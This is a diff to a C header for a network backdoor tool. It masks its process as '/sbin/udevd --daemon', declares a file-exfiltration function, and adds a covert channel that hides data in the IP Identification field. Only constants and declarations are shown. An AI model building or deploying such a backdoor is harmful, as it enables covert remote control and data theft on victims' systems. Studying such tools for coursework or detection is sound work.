@@ -39,19 +39,22 @@
 | ------------------------------------------------------------------------------
 */
 
-#define PROCESS_NAME    "/sbin/udevd --daemon"
+#define PROCESS_NAME        "/sbin/udevd --daemon"
 
 // Packet defaults
-#define PKT_SIZE        4096
+#define PKT_SIZE            4096
 
 // TCP Defaults
-#define WIN_SIZE        55840
-#define DEFAULT_TTL     255
-#define DEFAULT_IP_ID   12345
+#define WIN_SIZE            55840
+#define DEFAULT_TTL         255
+#define DEFAULT_IP_ID       12345
 
 // Client defaults (Can be spoofed but won't receive replies)
 #define DEFAULT_SRC_IP      "192.168.1.76"    // Client address. Backdoor replies
 #define DEFAULT_SRC_PORT    34231             // will be sent to this address and port
+
+// Response
+#define MESSAGE_MAX_SIZE   4096
 
 /*
 | ------------------------------------------------------------------------------
@@ -65,6 +68,7 @@ struct client_opt{
     char target_host[128];
     char command[BD_MAX_MSG_LEN];
     int target_port;
+    char device[128];
     int protocol;   // 0 - TCP, 1 - UDP
 };
 
@@ -109,11 +113,17 @@ struct addr_info {
     int sport;
 };
 
+struct message_buffer {
+    int position;
+    char buffer[MESSAGE_MAX_SIZE];
+};
+
 void client(struct client_opt c_opt);
-int send_tcp_datagram(struct addr_info *user_addr, char *data, int data_len);
-int send_udp_datagram(struct addr_info *user_addr, char *data, int data_len);
 void server(struct server_opt s_opt);
-void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
+int send_tcp_datagram(struct addr_info *user_addr, char *data, int data_len, int mode); // When mode is 0, send as normal payload
+int send_udp_datagram(struct addr_info *user_addr, char *data, int data_len, int mode); // ...else when mode is 1, send in IP Identification field (Covert channel)
+void client_packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
+void server_packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
 void server_exfil(char *file_path);
 void mask_process(char **, char *);
 void usage();
